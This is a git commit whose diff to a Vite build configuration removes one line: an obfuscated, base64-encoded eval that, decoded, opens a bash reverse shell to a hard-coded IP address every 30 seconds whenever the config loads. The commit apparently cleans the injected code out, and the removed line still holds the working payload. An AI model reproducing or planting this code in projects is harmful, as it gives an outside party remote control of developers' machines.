5ddc5c60f9da81d8d3c22992a07d45dac1641aae
Victor Montoya <vmontoya50@gmail.com>
2026-01-17 19:05:51 -0300

    fix de errores

--- vite.config.js
+++ vite.config.js
@@ -1,7 +1,6 @@
 import { defineConfig } from 'vite'
 import react from '@vitejs/plugin-react-swc'
 import { viteCommonjs } from '@originjs/vite-plugin-commonjs'
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
 // const path = require('path')
 
 // https://vitejs.dev/config/
